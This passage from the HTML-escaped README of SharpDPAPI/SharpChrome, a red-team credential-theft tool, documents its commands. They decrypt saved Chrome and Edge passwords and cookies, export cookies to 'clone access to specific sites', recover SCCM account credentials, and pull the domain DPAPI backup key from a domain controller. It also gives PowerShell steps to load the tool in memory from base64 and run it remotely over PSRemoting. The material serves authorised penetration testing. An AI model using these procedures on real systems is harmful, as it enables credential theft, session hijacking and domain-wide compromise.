[/path:HKLM\path\to\key] [/showErrors]&#xA;SharpDPAPI.exe search /type:folder /path:C:\path\to\folder [/maxBytes:&amp;lt;numOfBytes&amp;gt;] [/showErrors]&#xA;SharpDPAPI.exe search /type:file /path:C:\path\to\file [/maxBytes:&amp;lt;numOfBytes&amp;gt;]&#xA;SharpDPAPI.exe search /type:base64 [/base:&amp;lt;base64 string&amp;gt;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;search&lt;/code&gt; command works by searching for the following bytes, which represent the header (Version + DPAPI provider GUID) of DPAPI blob structure:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The search command has different arguments depending on the data type being scanned. To designate the data type, use the &lt;code&gt;/type&lt;/code&gt; argument specifying &lt;code&gt;registry&lt;/code&gt;, &lt;code&gt;folder&lt;/code&gt;, &lt;code&gt;file&lt;/code&gt;, or &lt;code&gt;base64&lt;/code&gt;. If the &lt;code&gt;/type&lt;/code&gt; argument is not present, the command will search the registry by default.&lt;/p&gt; &#xA;&lt;p&gt;When searching the registry with no other arguments, the command will recursively search the HKEY_LOCAL_MACHINE and HKEY_USERS hives. Use &lt;code&gt;/path&lt;/code&gt; parameter to specify a root to key to search from (e.g. &lt;code&gt;/path:HKLM\Software&lt;/code&gt;) and use the &lt;code&gt;/showErrors&lt;/code&gt; argument to display errors that occuring during enumeration.&lt;/p&gt; &#xA;&lt;p&gt;When searching a file or folder, specify a path with &lt;code&gt;/path:C:\Path\to\file\or\folder&lt;/code&gt; and optionally use &lt;code&gt;/maxBytes:&amp;lt;int&amp;gt;&lt;/code&gt; to specify the number of bytes to read from each file (default: 1024 bytes). The command will read the bytes from the beginning of the file and search for DPAPI blobs. Use &lt;code&gt;/showErrors&lt;/code&gt; to display an errors that occur during enumeration.&lt;/p&gt; &#xA;&lt;p&gt;When searching a base64 blob, specify the base64-encoded bytes to scan with the &lt;code&gt;/base64:&amp;lt;base64 str&amp;gt;&lt;/code&gt; parameter.&lt;/p&gt; &#xA;&lt;h4&gt;SCCM&lt;/h4&gt; &#xA;&lt;p&gt;If elevated on a machine that is an SCCM client, if the SCCM environment is configured with a Network Access Account (NAA), the system master key-protected DPAPI blobs containing the NAA credentials can be retrieved via WMI; The &lt;strong&gt;SCCM&lt;/strong&gt; command will query the blobs via WMI, retrieve the system master keys, and decrypt the blobs.&lt;/p&gt; &#xA;&lt;h2&gt;SharpChrome Commands&lt;/h2&gt; &#xA;&lt;h3&gt;logins&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;strong&gt;logins&lt;/strong&gt; command will search for Chrome &#39;Login Data&#39; files and decrypt the saved login passwords. If execution is in an unelevated contect, CryptProtectData() will automatically be used to try to decrypt values. If &lt;code&gt;/browser:edge&lt;/code&gt; is specified, the newer Chromium-based Edge browser is triaged.&lt;/p&gt; &#xA;&lt;p&gt;Login Data files can also be decrypted with a) any &#34;{GUID}:SHA1 {GUID}:SHA1 ...&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys, or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;A specific Login Data file can be specified with &lt;code&gt;/target:FILE&lt;/code&gt;. A remote &lt;code&gt;/server:SERVER&lt;/code&gt; can be specified if a &lt;code&gt;/pvk&lt;/code&gt; or &lt;code&gt;/password&lt;/code&gt; is also supplied. If triaging newer Chrome/Edge instances, a &lt;code&gt;/statekey:X&lt;/code&gt; AES state key can be specified.&lt;/p&gt; &#xA;&lt;p&gt;By default, logins are displayed in a csv format. This can be modified with &lt;code&gt;/format:table&lt;/code&gt; for table output. Also, by default only non-null password value entries are displayed, but all values can be displayed with &lt;code&gt;/showall&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If run from an elevated context, Login Data files for ALL users will be triaged, otherwise only Login Data files for the current user will be processed.&lt;/p&gt; &#xA;&lt;h3&gt;cookies&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;strong&gt;cookies&lt;/strong&gt; command will search for Chromium &#39;Cookies&#39; files and decrypt cookie values. If execution is in an unelevated contect, CryptProtectData() will automatically be used to try to decrypt values. You can change the target application using the &lt;code&gt;/browser:&amp;lt;VALUE&amp;gt;&lt;/code&gt; (e.g., edge, brave, slack).&lt;/p&gt; &#xA;&lt;p&gt;Cookie files can also be decrypted with a) any &#34;{GUID}:SHA1 {GUID}:SHA1 ...&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys, or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;A specific Cookies file can be specified with &lt;code&gt;/target:FILE&lt;/code&gt;. A remote &lt;code&gt;/server:SERVER&lt;/code&gt; can be specified if a &lt;code&gt;/pvk&lt;/code&gt; or &lt;code&gt;/password&lt;/code&gt; is also supplied. If triaging newer Chrome/Edge instances, a &lt;code&gt;/statekey:X&lt;/code&gt; AES state key can be specified.&lt;/p&gt; &#xA;&lt;p&gt;By default, cookies are displayed in a csv format. This can be modified with &lt;code&gt;/format:table&lt;/code&gt; for table output, or &lt;code&gt;/format:json&lt;/code&gt; for output importable by &lt;a href=&#34;https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en&#34;&gt;EditThisCookie&lt;/a&gt;. Also, by default only non-expired cookie value entries are displayed, but all values can be displayed with &lt;code&gt;/showall&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If run from an elevated context, Cookie files for ALL users will be triaged, otherwise only Cookie files for the current user will be processed.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;strong&gt;cookies&lt;/strong&gt; command also has &lt;code&gt;/cookie:REGEX&lt;/code&gt; and &lt;code&gt;/url:REGEX&lt;/code&gt; arguments to only return cookie names or urls matching the supplied regex. This is useful with &lt;code&gt;/format:json&lt;/code&gt; to easily clone access to specific sites.&lt;/p&gt; &#xA;&lt;h3&gt;statekeys&lt;/h3&gt; &#xA;&lt;p&gt;By default, the &lt;strong&gt;statekeys&lt;/strong&gt; command will search for Chromium-based applications (Google Chrome, Edge, Brave, and Slack), locate their AES statekey files (e.g., &#39;AppData\Local\Google\Chrome\User Data\Local State&#39; and &#39;AppData\Local\Microsoft\Edge\User Data\Local State&#39;), and decrypt them using the same type of arguments that can be supplied for &lt;code&gt;cookies&lt;/code&gt; and &lt;code&gt;logins&lt;/code&gt;. You may also supply the path to a specific state-key file using the &lt;code&gt;/target:&lt;/code&gt; parameter (e.g., &lt;code&gt;&#34;/target:C:\Users\Test\appdata\Local\Google\Chrome\User Data\Local State&#34;&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;State keys can also be decrypted with a) any &#34;{GUID}:SHA1 {GUID}:SHA1 ...&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys, or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;If run from an elevated context, state keys for ALL users will be triaged, otherwise only state keys for the current user will be processed.&lt;/p&gt; &#xA;&lt;h3&gt;backupkey&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;strong&gt;backupkey&lt;/strong&gt; command will retrieve the domain DPAPI backup key from a domain controller using the &lt;strong&gt;LsaRetrievePrivateData&lt;/strong&gt; API approach &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/raw/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927&#34;&gt;from Mimikatz&lt;/a&gt;. This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)&lt;/p&gt; &#xA;&lt;p&gt;Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;/nowrap&lt;/code&gt; flag will prevent wrapping the base64 key on display.&lt;/p&gt; &#xA;&lt;p&gt;This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz&#39; &lt;strong&gt;dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk&lt;/strong&gt; module, or used in blob/file /pvk:X form with the &lt;strong&gt;masterkeys&lt;/strong&gt;, &lt;strong&gt;credentials&lt;/strong&gt;, or &lt;strong&gt;vault&lt;/strong&gt; SharpDPAPI commands.&lt;/p&gt; &#xA;&lt;p&gt;By default, SharpDPAPI will try to determine the current domain controller via the &lt;strong&gt;DsGetDcName&lt;/strong&gt; API call. A server can be specified with &lt;code&gt;/server:COMPUTER.domain.com&lt;/code&gt;. If you want the key saved to disk instead of output as a base64 blob, use &lt;code&gt;/file:key.pvk&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Compile Instructions&lt;/h2&gt; &#xA;&lt;p&gt;We are not planning on releasing binaries for SharpDPAPI, so you will have to compile yourself :)&lt;/p&gt; &#xA;&lt;p&gt;SharpDPAPI has been built against .NET 3.5 and is compatible with &lt;a href=&#34;https://visualstudio.microsoft.com/vs/community/&#34;&gt;Visual Studio 2019 Community Edition&lt;/a&gt;. Simply open up the project .sln, choose &#34;Release&#34;, and build.&lt;/p&gt; &#xA;&lt;h3&gt;Targeting other .NET versions&lt;/h3&gt; &#xA;&lt;p&gt;SharpDPAPI&#39;s default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target SharpDPAPI for .NET 4 or 4.5, open the .sln solution, go to &lt;strong&gt;Project&lt;/strong&gt; -&amp;gt; &lt;strong&gt;SharpDPAPI Properties&lt;/strong&gt; and change the &#34;Target framework&#34; to another version.&lt;/p&gt; &#xA;&lt;h3&gt;Sidenote: Running SharpDPAPI Through PowerShell&lt;/h3&gt; &#xA;&lt;p&gt;If you want to run SharpDPAPI in-memory through a PowerShell wrapper, first compile the SharpDPAPI and base64-encode the resulting assembly:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Convert]::ToBase64String([IO.File]::ReadAllBytes(&#34;C:\Temp\SharpDPAPI.exe&#34;)) | Out-File -Encoding ASCII C:\Temp\SharpDPAPI.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;SharpDPAPI can then be loaded in a PowerShell script with the following (where &#34;aa...&#34; is replaced with the base64-encoded SharpDPAPI assembly string):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$SharpDPAPIAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(&#34;aa...&#34;))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Main() method and any arguments can then be invoked as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[SharpDPAPI.Program]::Main(&#34;machinemasterkeys&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Sidenote Sidenote: Running SharpDPAPI Over PSRemoting&lt;/h4&gt; &#xA;&lt;p&gt;Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, SharpDPAPI has a function to help with that.&lt;/p&gt; &#xA;&lt;p&gt;If you follow the instructions in &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sidenote-running-sharpdpapi-through-powershell&#34;&gt;Sidenote: Running SharpDPAPI Through PowerShell&lt;/a&gt; to create a SharpDPAPI.ps1, append something like the following to the script:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[SharpDPAPI.Program]::MainString(&#34;machinemasterkeys&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should then be able to run SharpDPAPI over PSRemoting with something like the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$s = New-PSSession dc.theshire.local&#xA;Invoke-Command -Session $s -FilePath C:\Temp\SharpDPAPI.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively, SharpDPAPI &lt;code&gt;/consoleoutfile:C:\FILE.txt&lt;/code&gt; argument will redirect all output streams to the specified file.&lt;/p&gt;</summary>
  </entry>
</feed>